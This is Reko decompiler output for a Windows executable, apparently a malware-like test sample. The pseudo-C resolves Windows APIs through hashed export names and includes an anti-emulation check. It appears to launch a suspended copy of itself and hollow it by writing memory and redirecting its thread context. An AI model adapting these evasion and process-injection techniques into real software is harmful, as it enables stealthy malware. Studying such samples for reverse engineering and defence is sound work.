// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040125D: Register word32 fn0040125D(Register word32 ecx)
word32 fn0040125D(word32 ecx)
{
	GetModuleFileNameA(null, &globals->t403780, 0x0104);
	ptr32 esp_34;
	word32 ebp_35;
	word32 eax_36;
	word32 ebx_37;
	word32 esi_38;
	word32 edi_39;
	word32 ecx_40;
	word32 edx_41;
	byte SCZO_42;
	globals->t403164();
	*(esp_34 - 0x04) = globals->dw40304C;
	*(esp_34 - 0x08) = 0x00403884;
	ptr32 esp_48;
	word32 ebp_49;
	word32 eax_50;
	word32 ebx_51;
	word32 esi_52;
	word32 edi_53;
	word32 ecx_54;
	word32 edx_55;
	byte SCZO_56;
	globals->t403168();
	*(esp_48 - 0x04) = globals->dw403034;
	*(esp_48 - 0x08) = 0x00403884;
	ptr32 esp_62;
	word32 ebp_63;
	word32 eax_64;
	word32 ebx_65;
	word32 esi_66;
	word32 edi_67;
	word32 ecx_68;
	word32 edx_69;
	byte SCZO_70;
	globals->t403168();
	*(esp_62 - 0x04) = globals->dw403000;
	*(esp_62 - 0x08) = 0x00403884;
	ptr32 esp_77;
	word32 ebp_78;
	word32 eax_79;
	word32 ebx_80;
	word32 esi_81;
	word32 edi_82;
	word32 ecx_83;
	word32 edx_84;
	byte SCZO_85;
	globals->t403168();
	*(esp_77 - 0x04) = 0x00403780;
	*(esp_77 - 0x08) = 0x00403884;
	ptr32 esp_91;
	word32 ebp_92;
	word32 eax_93;
	word32 ebx_94;
	word32 esi_95;
	word32 edi_96;
	word32 ecx_97;
	word32 edx_98;
	byte SCZO_99;
	globals->t403168();
	globals->dw403988 = 0x44;
	globals->dw4039B4 = 0x01;
	globals->w4039B8 = 0x02;
	*(esp_91 - 0x04) = 4209100;
	*(esp_91 - 0x08) = 0x00403988;
	*(esp_91 - 0x0C) = 0x00;
	*(esp_91 - 0x10) = 0x00;
	*(esp_91 - 0x14) = 0x04;
	*(esp_91 - 0x18) = 0x00;
	*(esp_91 - 0x1C) = 0x00;
	*(esp_91 - 0x20) = 0x00;
	*(esp_91 - 0x24) = 0x00403884;
	*(esp_91 - 0x28) = 0x00;
	ptr32 esp_125;
	word32 ebp_126;
	word32 eax_127;
	word32 ebx_128;
	word32 esi_129;
	word32 edi_130;
	word32 ecx_131;
	word32 edx_132;
	byte SCZO_133;
	globals->t4039DC();
	*(esp_125 - 0x04) = 0x00;
	Eq_6 eax_136 = GetModuleHandleA(*(esp_125 - 0x04));
	Eq_214 edx_139 = eax_136->ptr003C;
	*(esp_125 - 0x04) = 0x40;
	*(esp_125 - 0x08) = 0x3000;
	word32 eax_140 = eax_136 + edx_139;
	*(esp_125 - 0x0C) = eax_140->dw0050;
	*(esp_125 - 0x10) = (HMODULE *) eax_136;
	*(esp_125 - 0x14) = globals->dw4039CC;
	ptr32 esp_155;
	word32 ebp_156;
	word32 eax_157;
	word32 ebx_158;
	struct Eq_256 * esi_159;
	word32 edi_160;
	word32 ecx_161;
	word32 edx_162;
	byte SCZO_163;
	globals->t4039E0();
	*(esp_155 - 0x04) = fp - 0x08;
	*(esp_155 - 0x08) = esi_159->dw0050;
	*(esp_155 - 0x0C) = ebx_158;
	*(esp_155 - 0x10) = eax_157;
	*(esp_155 - 0x14) = globals->dw4039CC;
	ptr32 esp_178;
	word32 ebp_179;
	word32 eax_180;
	word32 ebx_181;
	word32 esi_182;
	word32 edi_183;
	word32 ecx_184;
	word32 edx_185;
	byte SCZO_186;
	globals->t4039E4();
	globals->dw4039E8 = 0x00010007;
	*(esp_178 - 0x04) = 0x004039E8;
	*(esp_178 - 0x08) = globals->dw4039D0;
	ptr32 esp_195;
	word32 ebp_196;
	word32 eax_197;
	word32 ebx_198;
	word32 esi_199;
	word32 edi_200;
	word32 ecx_201;
	word32 edx_202;
	byte SCZO_203;
	globals->t403CB4();
	globals->dw403AA0 = 0x00401000;
	*(esp_195 - 0x04) = 0x004039E8;
	*(esp_195 - 0x08) = globals->dw4039D0;
	ptr32 esp_212;
	word32 ebp_213;
	word32 eax_214;
	word32 ebx_215;
	word32 esi_216;
	word32 edi_217;
	word32 ecx_218;
	word32 edx_219;
	byte SCZO_220;
	globals->t403CB8();
	*(esp_212 - 0x04) = globals->dw4039D0;
	word32 esp_224;
	word32 ebp_225;
	word32 eax_226;
	word32 ebx_227;
	word32 esi_228;
	word32 edi_229;
	word32 ecx_230;
	word32 edx_231;
	byte SCZO_232;
	globals->t403CBC();
	return eax_226;
}

// 004013B0: Register Eq_8 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_6 eax_13 = LoadLibraryW(&globals->t402000);
	Eq_386 ecx_22;
	word32 eax_23 = fn004015E8(eax_13 + ecx, ecx, eax_13, 1111071457, out ecx_22);
	globals->t4039DC = eax_23;
	Eq_386 ecx_31;
	word32 eax_32 = fn004015E8(eax_23 + ecx_22, ecx_22, eax_13, 2662836352, out ecx_31);
	globals->t4039E0 = eax_32;
	Eq_386 ecx_40;
	word32 eax_41 = fn004015E8(eax_32 + ecx_31, ecx_31, eax_13, 3227337923, out ecx_40);
	globals->t4039E4 = eax_41;
	Eq_386 ecx_48;
	Eq_23 eax_49 = fn004015E8(eax_41, ecx_40, eax_13, 2920553433, out ecx_48);
	globals->t403CB4 = eax_49;
	Eq_386 ecx_57;
	word32 eax_58 = fn004015E8(eax_49 + ecx_48, ecx_48, eax_13, 2920559577, out ecx_57);
	globals->t403CB8 = eax_58;
	Eq_386 ecx_65;
	Eq_23 eax_66 = fn004015E8(eax_58, ecx_57, eax_13, 0xD0C0AF1A, out ecx_65);
	globals->t403CBC = eax_66;
	Eq_386 ecx_74;
	word32 eax_75 = fn004015E8(eax_66 + ecx_65, ecx_65, eax_13, 827345528, out ecx_74);
	globals->t403CC0 = eax_75;
	Eq_386 ecx_83;
	word32 eax_84 = fn004015E8(eax_75 + ecx_74, ecx_74, eax_13, 1053211448, out ecx_83);
	globals->t403CC4 = eax_84;
	Eq_386 ecx_92;
	word32 eax_93 = fn004015E8(eax_84 + ecx_83, ecx_83, eax_13, 0x63E49007, out ecx_92);
	globals->t40316C = eax_93;
	Eq_386 ecx_101;
	word32 eax_102 = fn004015E8(eax_93 + ecx_92, ecx_92, eax_13, 1945573565, out ecx_101);
	globals->t403168 = eax_102;
	Eq_386 ecx_110;
	word32 eax_111 = fn004015E8(eax_102 + ecx_101, ecx_101, eax_13, 1945329213, out ecx_110);
	globals->t403164 = eax_111;
	Eq_386 ecx_118;
	Eq_23 eax_119 = fn004015E8(eax_111, ecx_110, eax_13, 1914049981, out ecx_118);
	globals->t403CC8 = eax_119;
	Eq_386 ecx_126;
	Eq_23 eax_127 = fn004015E8(eax_119, ecx_118, eax_13, 0x6324080E, out ecx_126);
	globals->t403174 = eax_127;
	Eq_386 ecx_134;
	Eq_23 eax_135 = fn004015E8(eax_127, ecx_126, eax_13, 551975043, out ecx_134);
	globals->t403170 = eax_135;
	Eq_386 ecx_142;
	Eq_23 eax_143 = fn004015E8(eax_135, ecx_134, eax_13, 0x2AA660FE, out ecx_142);
	globals->t403178 = eax_143;
	Eq_386 ecx_150;
	Eq_23 eax_151 = fn004015E8(eax_143, ecx_142, eax_13, 0xA3AE6135, out ecx_150);
	globals->t403CCC = eax_151;
	Eq_386 ecx_158;
	Eq_23 eax_159 = fn004015E8(eax_151, ecx_150, eax_13, 2758376600, out ecx_158);
	globals->t403CD0 = eax_159;
	word32 ecx_167;
	Mem170[0x00403CD4:word32] = fn004015E8(eax_159 + ecx_158, ecx_158, eax_13, 0xD96820F4, out ecx_167);
	ptr32 esp_177;
	word32 ebp_178;
	byte SCZO_179;
	word32 ebx_180;
	word32 eax_181;
	word32 ecx_182;
	byte SZO_183;
	bool C_184;
	globals->t403164();
	*(esp_177 - 0x04) = globals->dw40302C;
	*(esp_177 - 0x08) = fp - 0x24;
	ptr32 esp_191;
	word32 ebp_192;
	byte SCZO_193;
	word32 ebx_194;
	word32 eax_195;
	word32 ecx_196;
	byte SZO_197;
	bool C_198;
	globals->t403168();
	*(esp_191 - 0x04) = globals->dw403010;
	*(esp_191 - 0x08) = fp - 0x24;
	ptr32 esp_205;
	word32 ebp_206;
	byte SCZO_207;
	word32 ebx_208;
	word32 eax_209;
	word32 ecx_210;
	byte SZO_211;
	bool C_212;
	globals->t403168();
	*(esp_205 - 0x04) = globals->dw403040;
	*(esp_205 - 0x08) = fp - 0x24;
	ptr32 esp_219;
	word32 ebp_220;
	byte SCZO_221;
	word32 ebx_222;
	word32 eax_223;
	word32 ecx_224;
	byte SZO_225;
	bool C_226;
	globals->t403168();
	*(esp_219 - 0x04) = fp - 0x24;
	ptr32 esp_230;
	word32 ebp_231;
	byte SCZO_232;
	word32 ebx_233;
	Eq_23 eax_234;
	Eq_386 ecx_235;
	byte SZO_236;
	bool C_237;
	globals->t40316C();
	*(esp_230 - 0x04) = 3283536260;
	*(esp_230 - 0x08) = (HMODULE *) eax_234;
	Eq_386 ecx_245;
	Eq_23 eax_246 = fn004015E8(eax_234, ecx_235, dwArg00, dwArg04, out ecx_245);
	globals->t403CD8 = eax_246;
	*(esp_230 - 0x04) = 2891001334;
	*(esp_230 - 0x08) = (HMODULE *) eax_234;
	Eq_386 ecx_254;
	word32 eax_255 = fn004015E8(eax_246 + ecx_245, ecx_245, dwArg00, dwArg04, out ecx_254);
	globals->t403CDC = eax_255;
	*(esp_230 - 0x04) = 3161736848;
	*(esp_230 - 0x08) = (HMODULE *) eax_234;
	Eq_386 ecx_262;
	Eq_23 eax_263 = fn004015E8(eax_255, ecx_254, dwArg00, dwArg04, out ecx_262);
	globals->t403CE0 = eax_263;
	*(esp_230 - 0x04) = 505991828;
	*(esp_230 - 0x08) = (HMODULE *) eax_234;
	Eq_386 ecx_270;
	Eq_23 eax_271 = fn004015E8(eax_263, ecx_262, dwArg00, dwArg04, out ecx_270);
	globals->t403CE4 = eax_271;
	*(esp_230 - 0x04) = 0x0DE900C7;
	*(esp_230 - 0x08) = (HMODULE *) eax_234;
	word32 ecx_278;
	globals->t403CE8 = fn004015E8(eax_271, ecx_270, dwArg00, dwArg04, out ecx_278);
	*(esp_230 - 0x04) = globals->dw403054;
	ptr32 esp_286;
	word32 ebp_287;
	byte SCZO_288;
	word32 ebx_289;
	word32 eax_290;
	Eq_386 ecx_291;
	byte SZO_292;
	bool C_293;
	globals->t40316C();
	*(esp_286 - 0x04) = 0xF303D8B8;
	*(esp_286 - 0x08) = eax_290;
	word32 ecx_300;
	globals->t403CEC = fn004015E8(ecx_291 + eax_290 / 0x04, ecx_291, dwArg00, dwArg04, out ecx_300);
	fn0040125D(ecx_300);
	*(esp_286 - 0x04) = 0x00;
	word32 esp_309;
	word32 ebp_310;
	byte SCZO_311;
	word32 ebx_312;
	word32 eax_313;
	word32 ecx_314;
	byte SZO_315;
	bool C_316;
	globals->t403CC4();
	return 0x00;
}

// 004015E8: Register Eq_23 fn004015E8(Register Eq_23 eax, Register Eq_386 ecx, Stack Eq_6 dwArg04, Stack uint32 dwArg08, Register out ptr32 ecxOut)
HMODULE fn004015E8(HMODULE eax, HMODULE ecx, HMODULE dwArg04, uint32 dwArg08, ptr32 & ecxOut)
{
	struct Eq_793 * eax_29 = dwArg04 + (&(dwArg04 + dwArg04->ptr003C / 0x0040)->ptr003C)[0x0F] / 0x0040;
	word16 eax_32[] = dwArg04 + eax_29->dw0024 / 0x0040;
	uint32 esi_138 = dwArg08;
	word32 ecx_26;
	*ecxOut = dwArg04;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		esi_138 = dwArg08 + 0x000555E7;
	word32 eax_50[] = dwArg04 + eax_29->dw0020 / 0x0040;
	word32 eax_54[] = dwArg04 + eax_29->dw001C / 0x0040;
	int32 edi_121 = 0x00;
	while (true)
	{
		Eq_23 eax_119;
		if (edi_121 >= eax_29->dw0018)
			break;
		Eq_863 (* eax_96)[] = dwArg04 + eax_50[edi_121] / 0x0040;
		dwLoc1C = dwLoc1C & 0x00;
		uint32 eax_101 = 0x00;
		while (true)
		{
			word32 ecx_109;
			*ecxOut = eax_96;
			if (Mem0[dwLoc1C + eax_96:byte] == 0x00)
				break;
			eax_101 = (eax_101 << 0x07 | eax_101 >>u 0x19) ^ ((int32) Mem0[dwLoc1C + eax_96:byte] ^ 244);
			dwLoc1C = dwLoc1C + 0x01;
		}
		if (eax_101 == esi_138)
		{
			eax_119 = (Eq_23) (dwArg04 + eax_54[(word32) eax_32[edi_121]] / 0x0040);
			return eax_119;
		}
		edi_121 = edi_121 + 0x01;
	}
	eax_119 = (Eq_23) 0x00;
	return eax_119;
}

